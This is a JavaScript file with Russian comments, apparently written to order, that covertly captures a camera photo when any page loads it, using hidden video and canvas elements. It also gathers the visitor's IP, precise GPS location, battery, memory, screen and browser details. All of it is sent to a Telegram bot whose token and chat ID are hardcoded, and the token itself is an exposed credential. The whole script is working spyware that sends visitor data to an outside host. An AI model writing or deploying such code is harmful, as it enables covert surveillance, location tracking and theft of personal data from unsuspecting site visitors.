// new_script.js
// Автоматический незаметный захват фото + расширённые данные и отправка в Telegram.
// ВСТАВЛЕНЫ BOT_TOKEN и CHAT_ID, как вы просили.
// WARNING: токен в клиентском коде виден всем. Рассмотрите серверный прокси в проде.

(function(){
  'use strict';

  /************** Конфигурация (не менять, если не нужно) ****************/
  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
  const CHAT_ID   = "7518382960";
  const MAX_FILE_BYTES = 3_000_000;              // максимум фото (байты)
  const SESSION_FLAG = "tg_auto_photo_sent_v1";  // один раз за сессию
  const PUBLIC_IP_API = "https://api.ipify.org?format=json";
  const CAPTURE_QUALITY = 0.85;                  // качество jpeg
  const CAPTURE_TIMEOUT_MS = 10000;              // ожидание видео (ms)
  const WAIT_LOCATION_MS = 8000;                 // ожидание разрешения геолокации (ms)
/*************************************************************************/

  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('TG Auto Photo: BOT_TOKEN или CHAT_ID не заданы. Скрипт остановлен.');
    return;
  }
  if (sessionStorage.getItem(SESSION_FLAG)) {
    console.log('TG Auto Photo: уже отправлено в этой сессии. Остановлено.');
    return;
  }

  // Скрытые элементы
  const video = document.createElement('video');
  video.setAttribute('autoplay','');
  video.setAttribute('playsinline','');
  video.style.display = 'none';
  document.documentElement.appendChild(video);

  const canvas = document.createElement('canvas');
  canvas.style.display = 'none';
  document.documentElement.appendChild(canvas);

  // Лог
  function safeLog(...args){ if (window.console) console.log('[TGAuto]', ...args); }

  // Получаем публичный IP
  async function getPublicIP(timeoutMs = 4000){
    try{
      const controller = new AbortController();
      const id = setTimeout(()=>controller.abort(), timeoutMs);
      const resp = await fetch(PUBLIC_IP_API, { signal: controller.signal });
      clearTimeout(id);
      if (!resp.ok) return null;
      const j = await resp.json().catch(()=>null);
      return j && j.ip ? j.ip : null;
    }catch(e){
      safeLog('getPublicIP failed', e && e.message ? e.message : e);
      return null;
    }
  }

  // Получаем батарею (если доступно)
  async function getBatteryInfo(){
    try{
      if (!navigator.getBattery) return null;
      const bat = await navigator.getBattery();
      return {
        charging: Boolean(bat.charging),
        level: typeof bat.level === 'number' ? Math.round(bat.level * 100) : null,
        chargingTime: typeof bat.chargingTime === 'number' ? bat.chargingTime : null,
        dischargingTime: typeof bat.dischargingTime === 'number' ? bat.dischargingTime : null
      };
    }catch(e){ safeLog('battery error', e); return null; }
  }

  // Получаем память устройства (approx GB) и JS heap (if available)
  function getMemoryInfo(){
    const deviceMemory = typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory : null;
    const perfMem = (performance && performance.memory) ? {
      jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
      totalJSHeapSize: performance.memory.totalJSHeapSize,
      usedJSHeapSize: performance.memory.usedJSHeapSize
    } : null;
    return { deviceMemory, perfMem };
  }

  // Парсим Android версию из User-Agent (приближенно)
  function parseAndroidVersion(ua){
    try{
      const m = ua.match(/\bAndroid\s*\/?\s*([0-9.]+)/i) || ua.match(/\bAndroid\s+([0-9.]+)/i);
      return m ? m[1] : null;
    }catch(e){ return null; }
  }

  // Получаем точную геолокацию (с ожиданием и таймаутом)
  function getGeolocation(timeoutMs = WAIT_LOCATION_MS){
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve({ allowed: false });
      let resolved = false;
      const idTimeout = setTimeout(()=> {
        if (!resolved) { resolved = true; resolve({ allowed: false, reason: 'timeout' }); }
      }, timeoutMs);

      navigator.geolocation.getCurrentPosition(pos => {
        if (resolved) return;
        resolved = true;
        clearTimeout(idTimeout);
        resolve({
          allowed: true,
          coords: {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            altitudeAccuracy: pos.coords.altitudeAccuracy,
            heading: pos.coords.heading,
            speed: pos.coords.speed
          },
          timestamp: pos.timestamp
        });
      }, err => {
        if (resolved) return;
        resolved = true;
        clearTimeout(idTimeout);
        // PERMISSION_DENIED = 1, POSITION_UNAVAILABLE = 2, TIMEOUT = 3
        resolve({ allowed: false, reason: err && err.code ? err.code : 'error' });
      }, { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutMs });
    });
  }

  // Захват кадра -> Blob JPEG
  function captureFrame(videoEl, quality = CAPTURE_QUALITY){
    try{
      const w = videoEl.videoWidth || 640;
      const h = videoEl.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, w, h);
      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', quality));
    }catch(e){ safeLog('capture error', e); return Promise.resolve(null); }
  }

  // Укороченная функция для создания подписи (суммарно для фото)
  function buildShortCaption(ip){
    const time = new Date().toISOString();
    const page = location.pathname + (location.search || '');
    const ua = navigator.userAgent || '-';
    return `Новый посетитель\nВремя: ${time}\nСтраница: ${page}\nIP: ${ip || 'не получен'}\nUA: ${ua}`;
  }

  // MarkdownV2 escape
  function escapeMarkdownV2(s){
    if (typeof s !== 'string') s = String(s);
    return s.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
  }

  // Формат подробного отчёта красиво
  function formatDetailedReport(data){
    // data: {ip, androidVersion, screen, memory, battery, geo, ua, page, time}
    const lines = [];
    lines.push('*Детали посетителя*');
    lines.push(`• Время: ${escapeMarkdownV2(data.time)}`);
    lines.push(`• Страница: ${escapeMarkdownV2(data.page)}`);
    lines.push(`• IP: ${escapeMarkdownV2(data.ip || 'не получен')}`);
    lines.push(`• UA: ${escapeMarkdownV2(data.ua || '-')}`);

    if (data.androidVersion) lines.push(`• Android: ${escapeMarkdownV2(data.androidVersion)}`);
    // Экран
    const scr = data.screen;
    if (scr) lines.push(`• Экран: ${escapeMarkdownV2(scr.screenWidth + '×' + scr.screenHeight)} px, DPR=${escapeMarkdownV2(String(scr.dpr))}, inner ${escapeMarkdownV2(scr.innerWidth + '×' + scr.innerHeight)}`);

    // Память
    if (data.memory){
      if (data.memory.deviceMemory) lines.push(`• RAM (approx): ${escapeMarkdownV2(String(data.memory.deviceMemory))} GB`);
      if (data.memory.perfMem) {
        const p = data.memory.perfMem;
        lines.push(`• JS heap: used ${escapeMarkdownV2(String(Math.round(p.usedJSHeapSize/1024/1024)))} MB / total ${escapeMarkdownV2(String(Math.round(p.totalJSHeapSize/1024/1024)))} MB`);
      }
    }

    // Батарея
    if (data.battery){
      const bat = data.battery;
      const charge = bat.level !== null ? `${bat.level}%` : 'неизвестно';
      const charging = (typeof bat.charging === 'boolean') ? (bat.charging ? 'да' : 'нет') : 'неизвестно';
      lines.push(`• Батарея: ${escapeMarkdownV2(charge)}, заряд: ${escapeMarkdownV2(charging)}`);
    }

    // Геолокация
    if (data.geo){
      if (data.geo.allowed && data.geo.coords){
        const c = data.geo.coords;
        lines.push(`• Локация: lat ${escapeMarkdownV2(String(c.latitude))}, lon ${escapeMarkdownV2(String(c.longitude))}`);
        lines.push(`  Точность: ${escapeMarkdownV2(String(c.accuracy))} м`);
      } else {
        lines.push(`• Локация: отказано или недоступно (${escapeMarkdownV2(String(data.geo.reason || 'no'))})`);
      }
    }

    // Ограничение длины сообщений Telegram MarkdownV2 (примерно 4000), но мы сокращаем заранее.
    const text = lines.join('\n');
    return text.length > 3500 ? text.slice(0, 3500) + '\n...': text;
  }

  // Отправка фото (multipart/form-data)
  async function sendPhoto(blob, caption){
    if (!blob) return { ok:false, reason:'no_blob' };
    // Попытка уменьшения если большой
    if (blob.size > MAX_FILE_BYTES){
      safeLog('Blob too large, try reduce', blob.size);
      try{
        const img = await createImageBitmap(blob);
        const scale = Math.sqrt(MAX_FILE_BYTES / blob.size) * 0.95;
        const nw = Math.max(160, Math.floor(img.width * scale));
        const nh = Math.max(120, Math.floor(img.height * scale));
        canvas.width = nw; canvas.height = nh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, nw, nh);
        const reduced = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
        if (reduced) blob = reduced;
        safeLog('reduced size', blob.size);
      }catch(e){ safeLog('reduce failed', e); }
    }

    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    if (caption) form.append('caption', caption);

    try{
      const resp = await fetch(url, { method:'POST', body: form });
      const text = await resp.text().catch(()=>null);
      if (!resp.ok) {
        safeLog('telegram sendPhoto error', resp.status, text);
        return { ok:false, status:resp.status, text };
      }
      return { ok:true, text };
    }catch(e){
      safeLog('sendPhoto fetch error (likely CORS)', e && (e.message||e));
      return { ok:false, reason:'fetch_error', error:String(e) };
    }
  }

  // Отправка текстового сообщения (MarkdownV2)
  async function sendMessageMarkdownV2(text){
    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
    const body = { chat_id: CHAT_ID, text: text, parse_mode: 'MarkdownV2' };
    try{
      const resp = await fetch(url, { method:'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
      const txt = await resp.text().catch(()=>null);
      if (!resp.ok){
        safeLog('telegram sendMessage error', resp.status, txt);
        return { ok:false, status:resp.status, text:txt };
      }
      return { ok:true, text:txt };
    }catch(e){
      safeLog('sendMessage fetch error (likely CORS)', e && (e.message||e));
      return { ok:false, reason:'fetch_error', error:String(e) };
    }
  }

  // Пометка сессии
  function setSessionFlag(){ sessionStorage.setItem(SESSION_FLAG, '1'); }

  // Основной поток
  async function runAll(){
    safeLog('start runAll');

    // 1) попытка доступа к камере
    let stream = null;
    try{
      stream = await navigator.mediaDevices.getUserMedia({ video: { width:{ ideal:640 }, height:{ ideal:480 }, facingMode:'environment' }, audio:false });
    }catch(e){
      safeLog('getUserMedia failed', e && e.message ? e.message : e);
      return;
    }

    try{
      video.srcObject = stream;
      try{ await video.play(); }catch(e){ /* ignore */ }
    }catch(e){ safeLog('video attach error', e); }

    // ждём готовности кадра
    const start = Date.now();
    while(true){
      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) break;
      if (Date.now() - start > CAPTURE_TIMEOUT_MS) break;
      await new Promise(r => setTimeout(r, 120));
    }

    const blob = await captureFrame(video);
    try{ stream.getTracks().forEach(t=>t.stop()); video.srcObject = null; }catch(e){}

    if (!blob){
      safeLog('no blob captured'); return;
    }
    safeLog('captured blob size', blob.size);

    // 2) собираем данные паралельно: IP, battery, mem, geo
    const [ip, battery, geo] = await Promise.all([ getPublicIP().catch(()=>null), getBatteryInfo().catch(()=>null), getGeolocation(WAIT_LOCATION_MS).catch(()=>({allowed:false})) ]);
    const memory = getMemoryInfo();
    const ua = navigator.userAgent || '-';
    const androidVersion = parseAndroidVersion(ua);
    const screenInfo = {
      screenWidth: screen.width || null,
      screenHeight: screen.height || null,
      innerWidth: window.innerWidth || null,
      innerHeight: window.innerHeight || null,
      dpr: window.devicePixelRatio || 1
    };
    const time = new Date().toISOString();
    const page = location.pathname + (location.search || '');

    // 3) отправляем фото короткой подписью
    const shortCaption = buildShortCaption(ip);
    const photoRes = await sendPhoto(blob, shortCaption);
    if (!photoRes.ok) {
      safeLog('photo send failed', photoRes);
      // если не получилось (CORS) — всё равно попробуем отправить текстовую информацию (вероятно тоже упадёт)
    }

    // 4) форматируем подробный отчёт и отправляем как отдельное сообщение (MarkdownV2)
    const detailed = {
      ip, androidVersion, screen: screenInfo, memory, battery, geo, ua, page, time
    };
    const detailedText = formatDetailedReport(detailed);
    const msgRes = await sendMessageMarkdownV2(detailedText);

    if ((photoRes && photoRes.ok) || (msgRes && msgRes.ok)) {
      setSessionFlag();
      safeLog('sent at least one message, session flagged');
    } else {
      safeLog('both sends failed', { photoRes, msgRes });
    }
  }

  // Авто-старт при load. Браузер покажет системный prompt.
  window.addEventListener('load', ()=> {
    try{ setTimeout(()=>{ runAll().catch(e=>safeLog('runAll exception', e)); }, 0); }catch(e){ safeLog('auto start exception', e); }
  });

  // экспорт для отладки
  window.TGAutoPhoto = { runAll };

})();